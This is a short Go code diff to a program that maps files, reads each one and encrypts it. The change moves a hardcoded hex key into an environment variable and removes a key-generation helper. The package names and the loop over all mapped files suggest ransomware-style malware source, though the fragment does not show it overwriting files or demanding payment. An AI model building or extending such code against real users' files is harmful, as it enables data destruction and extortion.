@@ -13,14 +13,15 @@ import (
 )
 
 func main() {
-	files := explorer.MapFiles()
+	cryptoKey := os.Getenv("CRYPTO_KEY")
 
-	key, err := hex.DecodeString("c26997774c52475a5f57451eca76e83cc85fce405a4e30f9b7e0c219e9579fa3")
-	//crypter.GenerateKey()
+	key, err := hex.DecodeString(cryptoKey)
 
 	if err != nil {
 		panic(err)
 	}
+
+	files := explorer.MapFiles()
 
 	for _, v := range files {
 		file, err := ioutil.ReadFile(v)
@@ -45,18 +46,6 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-}
-
-func GenerateKey() ([]byte, error) {
-	key := make([]byte, 32)
-
-	_, err := io.ReadFull(rand.Reader, key)
-
-	if err != nil {
-		return nil, err
-	}
-
-	return key, nil
 }
 
 func Encrypt(plainText []byte, key []byte) ([]byte, error) {
